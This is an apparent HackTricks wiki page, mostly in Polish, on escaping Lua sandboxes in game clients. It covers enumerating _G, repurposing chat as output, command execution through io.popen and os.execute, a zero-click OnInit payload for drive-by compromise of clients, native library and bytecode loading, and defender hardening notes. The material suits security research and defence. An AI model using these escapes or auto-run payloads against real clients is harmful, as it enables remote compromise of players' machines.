# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ta strona zbiera praktyczne techniki służące do enumeracji i ucieczki z Lua "sandboxes" osadzonych w aplikacjach (w szczególności game clients, plugins lub in-app scripting engines). Wiele silników udostępnia ograniczone środowisko Lua, ale pozostawia dostępne potężne globalne obiekty, które umożliwiają wykonanie dowolnych poleceń lub nawet natywną korupcję pamięci, gdy exposed bytecode loaders.

Kluczowe pomysły:
- Traktuj VM jako nieznane środowisko: enumeruj _G i odkryj, które niebezpieczne prymitywy są dostępne.
- Gdy stdout/print jest zablokowany, wykorzystaj dowolny in-VM UI/IPC channel jako miejsce wyjścia, aby obserwować wyniki.
- Jeśli io/os jest udostępnione, często masz bezpośrednie wykonanie poleceń (io.popen, os.execute).
- Jeśli load/loadstring/loadfile są udostępnione, wykonanie spreparowanego Lua bytecode może obalić bezpieczeństwo pamięci w niektórych wersjach (≤5.1 verifiers są omijane; 5.2 usunął verifier), umożliwiając zaawansowaną eksploatację.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Jeśli print() nie jest dostępne, ponownie wykorzystaj kanały in-VM. Przykład z VM skryptu housing w MMO, gdzie wyjście czatu działa tylko po wywołaniu dźwięku; poniższe tworzy niezawodną funkcję wyjścia:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Uogólnij ten wzorzec dla swojego celu: każde pole tekstowe, toast, logger lub callback UI, który przyjmuje strings, może działać jako stdout do reconnaissance.

## Bezpośrednie wykonanie poleceń, jeśli io/os są udostępnione

Jeśli sandbox nadal udostępnia biblioteki standardowe io lub os, prawdopodobnie masz natychmiastowe wykonanie poleceń:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notatki:
- Wykonanie odbywa się wewnątrz procesu klienta; wiele warstw anti-cheat/antidebug, które blokują zewnętrzne debugery, nie zapobiegnie tworzeniu procesów in-VM.
- Sprawdź też: package.loadlib (ładowanie dowolnego DLL/.so), require with native modules, LuaJIT's ffi (jeśli obecny), oraz debug library (może podnieść uprawnienia wewnątrz VM).

## Zero-click triggers via auto-run callbacks

Jeśli aplikacja hosta przesyła skrypty do klientów i VM udostępnia auto-run hooks (np. OnInit/OnLoad/OnEnter), umieść tam swój payload, aby przeprowadzić drive-by compromise zaraz po załadowaniu skryptu:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Każde równoważne wywołanie zwrotne (OnLoad, OnEnter, itd.) uogólnia tę technikę, gdy skrypty są przesyłane i wykonywane automatycznie po stronie klienta.

## Niebezpieczne prymitywy do wyszukania podczas rozpoznania

Podczas enumeracji _G szczególnie zwróć uwagę na:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: wykonuje source lub bytecode; umożliwia ładowanie niezaufanego bytecode.
- package, package.loadlib, require: dynamiczne ładowanie bibliotek i surface modułu.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo i hooks.
- LuaJIT-only: ffi.cdef, ffi.load do wywoływania native code bezpośrednio.

Minimalne przykłady użycia (jeśli osiągalne):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optional escalation: abusing Lua bytecode loaders

Gdy load/loadstring/loadfile są dostępne, ale io/os są ograniczone, wykonanie spreparowanego Lua bytecode może prowadzić do ujawnienia pamięci oraz prymitywów do jej korupcji. Kluczowe fakty:
- Lua ≤ 5.1 zawierał weryfikator bajtkodu, który ma znane obejścia.
- Lua 5.2 usunął weryfikator całkowicie (oficjalne stanowisko: aplikacje powinny po prostu odrzucać precompiled chunks), co poszerza powierzchnię ataku jeśli ładowanie bajtkodu nie jest zabronione.
- Typowe workflow: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

Ta ścieżka jest specyficzna dla silnika/wersji i wymaga RE. Zobacz references dla dogłębnych analiz, prymitywów eksploatacji i przykładów gadgetów w grach.

## Detection and hardening notes (for defenders)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
